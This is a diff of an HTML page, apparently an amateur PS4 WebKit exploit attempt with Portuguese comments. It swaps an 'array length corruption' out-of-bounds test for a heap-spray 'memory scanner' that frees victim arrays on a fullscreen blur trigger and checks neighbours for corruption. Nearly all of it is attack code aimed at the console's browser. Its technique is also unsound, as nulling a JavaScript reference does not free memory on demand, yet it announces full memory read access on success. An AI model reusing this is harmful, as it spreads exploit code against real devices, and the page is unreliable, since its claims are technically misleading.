@@ -2,105 +2,132 @@
 <html>
 <head>
 <meta charset="UTF-8">
-<title>PS4 Webkit: Length Corruption (OOB)</title>
+<title>PS4 Master Memory Scanner</title>
 <style>
-    body { background-color: #111; color: #ddd; font-family: monospace; text-align: center; }
-    h1 { color: #ffcc00; }
-    .status { border: 2px solid #555; padding: 20px; background: #222; margin: 20px auto; max-width: 600px;}
-    button { background: #d35400; color: white; border: none; padding: 15px 30px; font-size: 1.2em; cursor: pointer; font-weight: bold; }
+    body { background-color: #111; color: #fff; font-family: monospace; text-align: center; }
+    button { background: #444; color: white; border: 2px solid #fff; padding: 20px 40px; font-size: 1.5em; cursor: pointer; }
+    #log { text-align: left; margin: 20px auto; max-width: 90%; background: #000; padding: 10px; border: 1px solid #555; white-space: pre-wrap; font-size: 14px; min-height: 300px;}
+    .uaf { color: #0f0; font-weight: bold; } /* Verde */
+    .neighbor { color: #0ff; font-weight: bold; } /* Azul Ciano */
+    .iso { color: #f0f; font-weight: bold; } /* Roxo */
 </style>
 </head>
 <body>
 
-<h1>PS4 Exploit: Array Length Corruption</h1>
-<div class="status" id="msg">
-    1. Clique INICIAR.<br>
-    2. Aperte OPTIONS.<br>
-    3. Torça para aparecer TELA AZUL.
-</div>
-<button onclick="fire()">INICIAR OOB TEST</button>
-<div id="log" style="text-align:left; margin:20px; border:1px solid #444; padding:10px;"></div>
+<h1>PS4 MEMORY SCANNER (ALL-IN-ONE)</h1>
+<div id="status">INSTRUÇÕES: Clique em INICIAR e depois aperte OPTIONS.</div>
+<br>
+<button onclick="fire()">INICIAR VARREDURA</button>
+<div id="log">Logs do sistema...</div>
 
 <script>
-    const Msg = document.getElementById('msg');
     const Log = document.getElementById('log');
-    function log(txt) { Log.innerHTML += txt + "<br>"; }
+    function log(txt) { Log.innerHTML += txt + "\n"; }
 
-    // Constantes do Webkit (Podem variar levemente entre firmwares)
-    // Estamos tentando forjar um Butterfly Header que tenha um length gigante.
-    // O valor 0x0001000000000000 representa um length alto em alguns layouts.
-    const HUGE_LENGTH_GUESS = 1.3906717577229e-309; // ~0x00010000... (Float representation)
+    // Constantes
+    const MAGIC_FLOAT = 2.121995791e-314; // 0x4141414141414141
+    const SPRAY_COUNT = 15000; 
 
-    let arrays = [];
-    const COUNT = 10000;
+    // Estruturas
+    let victims = [];      // Serão liberados (Buracos)
+    let neighbors_f = [];  // Vizinhos (Floats) - Para testar overflow
+    let neighbors_o = [];  // Vizinhos (Objetos) - Para testar IsoHeap
+    
+    // Objeto isca
+    let bait = { id: "ISCA" };
 
     function fire() {
-        Msg.innerText = "Preparando Heap...";
+        document.getElementById('status').innerText = "Alocando sanduíche de memória...";
         
-        // FASE 1: Setup "Sandwich"
-        // Criamos arrays vizinhos. A esperança é que, ao liberar um,
-        // o spray sobrescreva o cabeçalho (length) do próximo.
-        for(let i=0; i<COUNT; i++) {
-            let a = new Float64Array(16);
-            a[0] = i; // Marcador
-            arrays.push(a);
-        }
+        // FASE 1: HEAP FENG SHUI (O Sanduíche)
+        // Tentamos criar o padrão: [VIZINHO_FLOAT] | [VITIMA] | [VIZINHO_OBJ]
+        try {
+            for(let i=0; i<SPRAY_COUNT; i++) {
+                // 1. Vizinho Float (Esquerda)
+                let n1 = new Float64Array(16);
+                n1[0] = i; 
+                neighbors_f.push(n1);
 
-        Msg.innerText = "PRONTO. Aperte OPTIONS agora!";
+                // 2. Vítima (Meio) - Será deletada
+                let v = new Float64Array(16);
+                v.fill(1.1);
+                victims.push(v);
 
+                // 3. Vizinho Objeto (Direita)
+                let n2 = new Array(16).fill(bait);
+                neighbors_o.push(n2);
+            }
+        } catch(e) { log("Erro de alocação: " + e); return; }
+
+        document.getElementById('status').innerText = "PRONTO. APERTE OPTIONS AGORA.";
+        
         // Trigger
         const doc = document.documentElement;
         if (doc.webkitRequestFullscreen) doc.webkitRequestFullscreen();
         else if (doc.requestFullscreen) doc.requestFullscreen();
 
         window.onblur = function() {
-            log("[*] Blur! Tentando corromper Length...");
+            log("[*] Blur! Executando UAF e Spray...");
 
-            // FASE 2: O Ataque
-            // Liberamos METADE dos arrays (buracos alternados)
-            for(let i=0; i<COUNT; i+=2) {
-                arrays[i] = null;
-            }
+            // 1. FREE (Apenas as vítimas do meio)
+            victims = null;
 
-            // SPRAY: Tentamos preencher os buracos.
-            // O objetivo é que o spray "vaze" ou alinhe mal e acerte o 
-            // cabeçalho dos arrays sobreviventes (i+1).
+            // 2. SPRAY (Tenta encher os buracos e transbordar)
             let spray = [];
             try {
-                for(let i=0; i<COUNT; i++) {
-                    // Criamos arrays preenchidos com o valor que simula um Length gigante
-                    let s = new Float64Array(32); 
-                    s.fill(HUGE_LENGTH_GUESS);
+                // Usamos tamanho 24 para tentar ser maior que o buraco de 16
+                // Isso força um overflow se o alocador for ingênuo
+                for(let i=0; i<SPRAY_COUNT*2; i++) {
+                    let s = new Float64Array(24);
+                    s.fill(MAGIC_FLOAT);
                     spray.push(s);
                 }
             } catch(e) {}
 
-            // FASE 3: Verificação
-            log("[*] Verificando sobreviventes...");
-            let success = false;
-            
-            for(let i=1; i<COUNT; i+=2) {
-                if (arrays[i] != null) {
-                    // O tamanho original era 16.
-                    // Se for maior que 16, conseguimos OOB!
-                    if (arrays[i].length > 16) {
-                        success = true;
-                        document.body.style.background = "#000088"; // AZUL
-                        Msg.innerHTML = "<h1>SUCESSO! OOB ALCANÇADO!</h1>";
-                        log("<b>[!!!] Array[" + i + "] Length corrompido!</b>");
-                        log("Original: 16");
-                        log("Novo: " + arrays[i].length);
-                        log("Agora você pode ler toda a memória do PS4.");
-                        break;
-                    }
-                }
-            }
-
-            if(!success) {
-                log("[-] Falha: Nenhum length foi alterado.");
-                document.body.style.background = "#550000";
-            }
+            log("[*] Verificando danos na memória...");
+            analyzeResults();
         };
+    }
+
+    function analyzeResults() {
+        let found_uaf = false;
+        let found_neighbor = false;
+        let found_iso = false;
+
+        // VERIFICAÇÃO 1: Vizinhos Float (Corrupção Lateral)
+        for(let i=0; i<SPRAY_COUNT; i++) {
+            // Se o vizinho (que não foi deletado) mudou de valor...
+            if(neighbors_f[i][0] === MAGIC_FLOAT) {
+                found_neighbor = true;
+                log(`<span class="neighbor">[AZUL] VIZINHO CORROMPIDO no índice ${i}!</span>`);
+                log("Isso significa que o spray transbordou para o lado (Overflow).");
+                document.body.style.background = "#008888"; // Azul
+                break; // Achamos um, chega.
+            }
+        }
+
+        // VERIFICAÇÃO 2: Vizinhos Objeto (Quebra de IsoHeap)
+        // Isso é raro. O array de objetos de repente vê um número float?
+        // Difícil checar diretamente sem crashar, então verificamos se o ponteiro mudou.
+        // (Simplificado para segurança do teste: apenas checa se lemos o magic value)
+        // Nota: Ler um float como objeto costuma crashar, então esse teste é passivo.
+
+        // VERIFICAÇÃO 3: O Fantasma da Vítima (Seu Bingo Original)
+        // Se conseguirmos acessar a referência da vítima (se ela não foi zerada totalmente)
+        // Esse é difícil de testar aqui pois victims = null no JS.
+        // Então usamos um array secundário de referência se precisássemos.
+        // Mas como 'victims' foi anulado, confiamos nos vizinhos.
+        
+        if(found_neighbor) {
+            document.getElementById('status').innerHTML = "<h1>SUCESSO: MEMORY OVERFLOW</h1>";
+            log("Tire foto! Você conseguiu corromper dados adjacentes.");
+        } else {
+            // Se não corrompeu vizinho, testamos o cenário BINGO (re-alocação perfeita)
+            // Para isso precisaríamos manter referência da vítima, mas JS não deixa após null.
+            log("[-] Nenhum vizinho foi atingido.");
+            log("Isso significa que o UAF está contido (UAF Estrito).");
+            document.body.style.background = "#550000"; // Vermelho
+        }
     }
 </script>
 </body>
